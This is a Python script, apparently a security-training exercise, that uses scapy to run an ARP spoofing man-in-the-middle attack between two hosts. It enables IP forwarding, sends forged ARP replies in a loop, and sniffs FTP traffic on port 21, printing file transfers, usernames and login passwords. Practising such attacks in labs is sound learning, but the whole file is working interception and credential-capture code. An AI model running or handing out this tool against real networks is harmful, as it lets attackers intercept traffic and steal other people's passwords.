from parse_args import parse_arguments
import scapy.all as scapy
import os
import time
import threading

macAddress = os.getenv("MAC_INQUISITOR")


def enable_ip_forwarding():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")


def arp_spoofing(IP_src, IP_target, MAC_target):
    ether_frame = (scapy.Ether(dst=MAC_target) /
                   scapy.ARP(op=2, pdst=IP_target,
                             psrc=IP_src, hwdst=MAC_target))
    scapy.sendp(ether_frame, verbose=False)


def restore_arp(IP_src, MAC_src, IP_target, MAC_target):
    packet = scapy.ARP(op=2, pdst=IP_target, psrc=IP_src, hwdst=MAC_target,
                       hwsrc=MAC_src)
    scapy.send(packet, verbose=False)


def process_payload(payload, verbose):
    payload = payload.rstrip('\r\n')
    if ' ' in payload:
        header = payload.split(' ')[0]
    else:
        header = payload
    message = None
    if header == "STOR":
        message = f"Sending file '{payload[5:]}' to server"
    elif header == "RETR":
        message = f"Retrieving file '{payload[5:]}' from server"
    if not verbose:
        return message
    if header == "QUIT":
        message = "Disconnecting from server"
    elif header == "USER":
        message = f"User '{payload[5:]}' trying to connect to server"
    elif header == "PASS":
        message = "User entered the following password to connect: "
        f"'{payload[5:]}'"
    elif header == "530":
        message = f"Login error: {payload[4:]}"
    elif header == "230":
        message = "Login successful"
    return message


def process_ftp_packet(packet, verbose):
    if packet.haslayer(scapy.TCP) and packet.haslayer(scapy.IP):
        ip_src = packet[scapy.IP].src
        ip_dst = packet[scapy.IP].dst
        tcp_src = packet[scapy.TCP].sport
        tcp_dst = packet[scapy.TCP].dport
    if packet.haslayer(scapy.Raw) and packet.src == macAddress:
        payload = str(packet[scapy.Raw].load, 'utf-8', 'ignore')
        message = process_payload(payload, verbose)
        if message is not None:
            print(f"{ip_src}:{tcp_src} -> {ip_dst}:{tcp_dst}: {message}")


def sniffing_ftp(verbose):
    scapy.sniff(filter="tcp and port 21",
                prn=lambda x: process_ftp_packet(x, verbose))


def main():
    args = parse_arguments()
    sniffing_thread = threading.Thread(target=sniffing_ftp,
                                       args=(args.verbose,))
    sniffing_thread.daemon = True
    sniffing_thread.start()
    while True:
        try:
            arp_spoofing(args.IP_src, args.IP_target, args.MAC_target)
            arp_spoofing(args.IP_target, args.IP_src, args.MAC_src)
            time.sleep(1)
        except KeyboardInterrupt:
            print("Stopping process, restoring default ARP table...")
            restore_arp(args.IP_src, args.MAC_src, args.IP_target,
                        args.MAC_target)
            restore_arp(args.IP_target, args.MAC_target, args.IP_src,
                        args.MAC_src)
            exit(0)


if __name__ == "__main__":
    main()
